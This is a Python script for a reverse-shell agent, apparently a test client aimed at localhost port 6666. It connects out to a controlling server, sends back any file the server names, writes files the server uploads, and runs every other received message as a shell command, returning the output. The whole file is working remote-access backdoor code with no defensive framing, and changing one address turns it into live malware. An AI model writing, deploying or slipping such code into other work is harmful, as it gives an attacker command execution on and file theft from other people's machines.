import socket
import subprocess
import os

ip = '127.0.0.1'
port = 6666

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip, port))

msg = 'TEST CLIENT'
cs.send(msg.encode())

while True:
    try:
        msg = cs.recv(2048).decode()
        if msg == 'quit':
            break

        msg_parts = msg.split(" ")

        if msg_parts[0] == 'download':
            filename = msg_parts[1]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    contents = f.read()
                cs.send(contents)
            else:
                cs.send(b"Error: File not found on agent side.")

        elif msg_parts[0] == 'upload':
            filename = msg_parts[1]
            with open(filename, 'wb') as f:
                contents = cs.recv(2048) 
                f.write(contents)
            cs.send(b"File Upload Successful.")

        else:
            p = subprocess.Popen(
                msg_parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
            )
            output, error = p.communicate()
            if len(output) > 0:
                msg = output.decode()
            else:
                msg = error.decode()
            cs.send(msg.encode())

    except ConnectionResetError:
        print("Connection closed by server.")
        break

cs.close()